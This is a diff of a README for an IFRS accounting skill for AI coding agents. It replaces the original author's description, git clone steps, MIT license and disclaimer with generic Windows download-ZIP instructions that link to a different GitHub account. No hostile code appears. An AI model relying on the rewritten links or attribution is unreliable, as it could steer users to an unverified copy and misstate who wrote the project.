@@ -1,82 +1,196 @@
-# IFRS Skill for AI Coding Agents
+# 📘 ifrs-skill - IFRS workflows for clear reporting
 
-A comprehensive IFRS (International Financial Reporting Standards) skill that gives AI agents expert-level knowledge of all current IFRS and IAS standards. Works with Claude Code, Codex CLI, Gemini CLI, Cursor, and any agent supporting the [Agent Skills](https://agentskills.io) specification.
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/babu9893/ifrs-skill)
 
-## What It Does
+## 🚀 Getting Started
 
-- **Accounting Guidance** — Answer any IFRS question with paragraph-level citations
-- **Compliance & Audit Support** — Generate disclosure checklists, gap analyses, and audit memos
-- **GAAP-to-IFRS Transition** — Framework-agnostic transition planning with IFRS 1 procedures
-- **Audience Adaptation** — Adjusts depth for professionals (with citations) or learners (plain language)
-- **Currency Verification** — Automatically checks web for latest effective dates and amendments
+ifrs-skill helps AI agents work with IFRS tasks, audit checks, and financial reporting. It is built for users who want a simple way to run IFRS skill files on Windows and use them with tools like Claude Code, Codex, Gemini CLI, and Cursor.
 
-## Coverage
+Use this page to download and run the project from the link below:
 
-| Content | Details |
-|---------|---------|
-| **Standards** | All 40 active standards (IFRS 1-17, IAS 1-41) with scope, core principles, key rules, disclosure requirements, common pitfalls, and cross-references |
-| **Workflows** | 7 step-by-step procedures: Revenue (IFRS 15), Leases (IFRS 16), Impairment (IAS 36), Financial Instruments (IFRS 9), First-Time Adoption (IFRS 1), Deferred Tax (IAS 12), Business Combinations (IFRS 3) |
-| **Templates** | 5 structured formats: Disclosure checklist, Gap analysis, Audit memo, Management representation letter, Accounting policy summary |
-| **Transition** | 10 common difference areas, 3-phase project plan, IFRS 1 exemption framework, IT/system guidance, deferred tax implications |
-| **Interpretations** | Key IFRICs referenced in context (IFRIC 12, 21, 22, 23, and others) |
+[Visit the download page](https://github.com/babu9893/ifrs-skill)
 
-## Installation
+## 🖥️ What You Need
 
-### Claude Code
-```bash
-# Clone to your skills directory
-git clone https://github.com/ramyatrouny/ifrs-skill.git ~/.claude/skills/ifrs
+Before you start, make sure your Windows PC has:
 
-# Or copy manually
-cp -r ifrs/ ~/.claude/skills/ifrs/
-```
+- Windows 10 or Windows 11
+- A steady internet connection
+- Enough free disk space for the files
+- One of these tools if you plan to use the skill with an AI app:
+  - Claude Code
+  - Codex
+  - Gemini CLI
+  - Cursor
 
-### Codex CLI
-```bash
-git clone https://github.com/ramyatrouny/ifrs-skill.git ~/.codex/skills/ifrs
-```
+If you only want to view the files, you can do that in your browser after download.
 
-### Other Agents
-Copy the `ifrs/` folder to your agent's skills directory. The skill follows the [agentskills.io specification](https://agentskills.io/specification).
+## 📦 Download and Setup
 
-## File Structure
+1. Open the download page:
+   [https://github.com/babu9893/ifrs-skill](https://github.com/babu9893/ifrs-skill)
 
-```
-ifrs/
-  SKILL.md                  # Entry point (lightweight hub, ~300 words)
-  standards-reference.md    # All 40 IFRS/IAS standards (207KB)
-  workflows.md              # 7 step-by-step procedures (78KB)
-  compliance-templates.md   # 5 structured output templates (37KB)
-  transition-guide.md       # GAAP-to-IFRS transition guide (37KB)
-```
+2. On the GitHub page, look for the green or blue **Code** button.
 
-## How It Works
+3. Click **Code**, then choose **Download ZIP**.
 
-1. User asks an IFRS question
-2. `SKILL.md` loads and detects: task type, audience level, output format
-3. Agent reads the relevant supporting file(s) on demand
-4. Response adapts: professional (with citations) or learner (plain language)
+4. Save the ZIP file to your **Downloads** folder.
 
-## Example Queries
+5. Right-click the ZIP file and choose **Extract All**.
 
-- "How should we recognize revenue for a bundled software deal under IFRS 15?"
-- "Run a disclosure completeness check for our IFRS 16 lease notes"
-- "We're transitioning from local GAAP to IFRS — walk me through the process"
-- "Explain the expected credit loss model to someone new to IFRS 9"
-- "Prepare an audit memo for this business combination under IFRS 3"
+6. Pick a folder you can find again, such as:
+   - Desktop
+   - Documents
+   - Downloads
 
-## Contributing
+7. Open the extracted folder.
 
-Contributions are welcome! Areas where help is needed:
-- Additional workflows (IFRS 17 Insurance, IFRS 2 Share-based Payment)
-- Jurisdiction-specific adoption guides
-- Additional compliance templates
-- Translations
+8. Look for the main skill files, readme files, and any folders named for workflows, templates, or standards.
 
-## License
+9. If you use an AI app, copy the project folder to the location that app expects for skills or project files.
 
-MIT
+10. Open the app you want to use and point it to the ifrs-skill folder, or add the files as your app instructs.
 
-## Disclaimer
+## 🧭 How to Use It
 
-This skill provides technical guidance based on IFRS as issued by the IASB. It does not replace professional judgment. Consult qualified professionals for specific accounting decisions. Always refer to the full text of relevant standards and any jurisdiction-specific modifications.
+The repository is set up for IFRS work across many common tasks. You can use it for:
+
+- Financial reporting checks
+- Lease accounting review
+- Revenue recognition work
+- Audit support tasks
+- Compliance template use
+- Standard-by-standard guidance
+
+A simple way to use the files is:
+
+1. Open your AI app.
+2. Load the ifrs-skill folder.
+3. Ask the app to help with one task at a time.
+4. Use a clear request, such as:
+   - Review this lease note for IFRS issues
+   - Check this revenue summary against IFRS rules
+   - Create an audit checklist for this filing
+   - Draft a compliance template for a report
+5. Review the result before you use it in your work.
+
+## 📁 What’s Inside
+
+This project is built around IFRS work in a clear file structure. You can expect content for:
+
+- 40 IFRS standards
+- 7 workflows
+- 5 compliance templates
+- Audit and review tasks
+- Accounting guidance for common reporting cases
+- Support for AI agent use
+
+Typical areas covered include:
+
+- Lease accounting
+- Revenue recognition
+- Financial statement review
+- GAAP and IAS cross-checks
+- Compliance drafting
+- Audit preparation
+
+## 🧩 Supported Tools
+
+You can use ifrs-skill with:
+
+- Claude Code
+- Codex
+- Gemini CLI
+- Cursor
+
+Each tool may use files in a different way. If your app asks where to place project files, add the extracted ifrs-skill folder there.
+
+## 🔎 Common Use Cases
+
+Use this repository when you need help with:
+
+- Preparing IFRS reports
+- Checking accounting treatment
+- Building a compliance checklist
+- Reviewing lease terms
+- Testing revenue rules
+- Organizing audit notes
+- Creating standard-based prompts for AI agents
+
+This makes it easier to keep work aligned with reporting rules and team review steps.
+
+## 🛠️ Windows Tips
+
+If the ZIP file will not open:
+
+1. Right-click the file.
+2. Choose **Open with**.
+3. Select **File Explorer** or a ZIP tool like 7-Zip.
+
+If the folder is hard to find after extraction:
+
+- Search for `ifrs-skill` in File Explorer
+- Check your Downloads folder
+- Sort files by date to find the newest folder
+
+If your AI app cannot see the files:
+
+- Move the folder to a simple path like `C:\ifrs-skill`
+- Remove extra nested folders after extraction
+- Make sure the app has access to that folder
+
+## 📚 Helpful Folder Names
+
+When you open the project, you may see folders or files related to:
+
+- standards
+- workflows
+- templates
+- audit
+- compliance
+- reporting
+- prompts
+
+These names help you find the right content fast when you need help with a specific task.
+
+## 🧪 Example Tasks
+
+Here are a few ways a non-technical user might use this project:
+
+- Ask an AI app to explain an IFRS standard in plain language
+- Use a workflow to check a lease case
+- Fill out a compliance template for a report review
+- Compare a note against reporting rules
+- Build a prompt for an audit review
+- Check if revenue treatment fits the stated policy
+
+## 🔐 Best Practices
+
+- Keep the extracted folder in one place
+- Use short folder names
+- Work on one task at a time
+- Save a copy before making changes
+- Review outputs against your team’s process
+- Use the same folder path each time you open the project
+
+## 📄 Repository Details
+
+- Name: ifrs-skill
+- Type: IFRS skill files for AI agents
+- Focus: accounting, audit, compliance, and financial reporting
+- Topics: accounting, agent-skills, ai-agents, audit, claude-code, compliance, financial-reporting, gaap, ias, ifrs, lease-accounting, revenue-recognition
+
+## 📥 Download Again
+
+If you need the files again, use this page:
+
+[https://github.com/babu9893/ifrs-skill](https://github.com/babu9893/ifrs-skill)
+
+## 🧭 Quick Path for Windows Users
+
+1. Open the download page
+2. Download the ZIP file
+3. Extract it
+4. Open the folder
+5. Add it to your AI app
+6. Run your IFRS task
